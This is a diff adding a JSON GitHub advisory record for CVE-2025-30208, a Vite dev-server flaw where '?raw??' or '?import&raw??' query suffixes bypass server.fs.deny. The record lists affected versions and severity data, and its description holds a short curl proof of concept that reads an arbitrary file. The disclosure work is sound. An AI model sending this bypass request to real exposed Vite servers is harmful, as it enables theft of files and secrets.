@@ -1,0 +1,138 @@
+{
+  "ghsa_id": "GHSA-x574-m823-4x7w",
+  "cve_id": "CVE-2025-30208",
+  "url": "https://api.github.com/advisories/GHSA-x574-m823-4x7w",
+  "html_url": "https://github.com/advisories/GHSA-x574-m823-4x7w",
+  "summary": "Vite bypasses server.fs.deny when using ?raw??",
+  "description": "### Summary\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\nOnly apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n`@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes.\n\n### PoC\n```bash\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" > /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    <body>\n      <h1>403 Restricted</h1>\n      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n```",
+  "type": "reviewed",
+  "severity": "medium",
+  "repository_advisory_url": "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-x574-m823-4x7w",
+  "source_code_location": "https://github.com/vitejs/vite",
+  "identifiers": [
+    {
+      "value": "GHSA-x574-m823-4x7w",
+      "type": "GHSA"
+    },
+    {
+      "value": "CVE-2025-30208",
+      "type": "CVE"
+    }
+  ],
+  "references": [
+    "https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w",
+    "https://nvd.nist.gov/vuln/detail/CVE-2025-30208",
+    "https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4",
+    "https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c",
+    "https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41",
+    "https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca",
+    "https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1",
+    "https://github.com/advisories/GHSA-x574-m823-4x7w"
+  ],
+  "published_at": "2025-03-25T14:00:02Z",
+  "updated_at": "2025-03-25T14:00:04Z",
+  "github_reviewed_at": "2025-03-25T14:00:02Z",
+  "nvd_published_at": "2025-03-24T17:15:21Z",
+  "withdrawn_at": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite"
+      },
+      "vulnerable_version_range": ">= 6.2.0, < 6.2.3",
+      "first_patched_version": "6.2.3",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite"
+      },
+      "vulnerable_version_range": ">= 6.1.0, < 6.1.2",
+      "first_patched_version": "6.1.2",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite"
+      },
+      "vulnerable_version_range": ">= 6.0.0, < 6.0.12",
+      "first_patched_version": "6.0.12",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite"
+      },
+      "vulnerable_version_range": ">= 5.0.0, < 5.4.15",
+      "first_patched_version": "5.4.15",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite"
+      },
+      "vulnerable_version_range": "< 4.5.10",
+      "first_patched_version": "4.5.10",
+      "vulnerable_functions": []
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+      "score": 5.3
+    },
+    "cvss_v4": {
+      "vector_string": null,
+      "score": 0
+    }
+  },
+  "cwes": [
+    {
+      "cwe_id": "CWE-200",
+      "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+    },
+    {
+      "cwe_id": "CWE-284",
+      "name": "Improper Access Control"
+    }
+  ],
+  "credits": [
+    {
+      "user": {
+        "login": "Ezzer17",
+        "id": 31133048,
+        "node_id": "MDQ6VXNlcjMxMTMzMDQ4",
+        "avatar_url": "https://avatars.githubusercontent.com/u/31133048?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/Ezzer17",
+        "html_url": "https://github.com/Ezzer17",
+        "followers_url": "https://api.github.com/users/Ezzer17/followers",
+        "following_url": "https://api.github.com/users/Ezzer17/following{/other_user}",
+        "gists_url": "https://api.github.com/users/Ezzer17/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/Ezzer17/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/Ezzer17/subscriptions",
+        "organizations_url": "https://api.github.com/users/Ezzer17/orgs",
+        "repos_url": "https://api.github.com/users/Ezzer17/repos",
+        "events_url": "https://api.github.com/users/Ezzer17/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/Ezzer17/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter"
+    }
+  ],
+  "cvss": {
+    "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+    "score": 5.3
+  },
+  "epss": {
+    "percentage": 0.74969,
+    "percentile": 0.99469
+  }
+}
